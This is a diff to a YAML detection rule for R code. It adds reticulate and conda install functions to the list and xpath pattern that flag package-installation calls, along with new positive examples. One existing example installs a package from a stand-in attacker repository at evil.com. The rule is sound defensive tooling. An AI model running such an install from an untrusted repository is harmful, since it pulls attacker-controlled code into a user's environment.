@@ -22,6 +22,11 @@ functions:
   - pkg_install
   - local_install
   - lockfile_install
+  - py_install
+  - virtualenv_install
+  - conda_install
+  - virtualenv_create
+  - conda_create
 xpath: >-
   //SYMBOL_FUNCTION_CALL[
     (
@@ -33,6 +38,9 @@ xpath: >-
       or text() = 'install_cran' or text() = 'pak'
       or text() = 'pkg_install' or text() = 'local_install'
       or text() = 'lockfile_install'
+      or text() = 'py_install' or text() = 'virtualenv_install'
+      or text() = 'conda_install' or text() = 'virtualenv_create'
+      or text() = 'conda_create'
     )
     and not(preceding-sibling::OP-DOLLAR)
     and not(preceding-sibling::OP-AT)
@@ -45,6 +53,10 @@ xpath: >-
     ]
   ]
 positive_examples:
+  - |
+    reticulate::py_install("requests")
+  - |
+    conda_install("r-env", packages = "numpy")
   - |
     install.packages("foo", repos = "https://evil.com/cran")
   - |
